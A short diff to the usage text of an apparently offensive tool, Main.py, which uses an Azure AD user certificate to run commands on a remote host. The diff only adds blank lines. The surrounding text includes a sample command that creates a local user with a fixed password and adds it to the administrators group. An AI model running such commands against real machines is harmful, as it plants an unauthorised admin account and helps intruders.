@@ -7,6 +7,7 @@ data: 'Main.py [-h] --usercert USERCERT --certpass CERTPASS --remoteip REMOTEIP
 
   Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10
 
+
   python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT
   NAME>.onmicrosoft.com.pfx --
 
@@ -26,3 +27,5 @@ Main.py --usercert "admin.pfx" --certpass password --remoteip 10.10.10.10
 python Main.py --usercert C:\Users\Username\Documents\username\<USERNAME>@<TENANT NAME>.onmicrosoft.com.pfx --
 certpass AzureADCert --remoteip 10.10.10.10 --command "cmd.exe /c net user username Password@123 /add /Y && net localgroup administrators username /add"
 ```
+
+
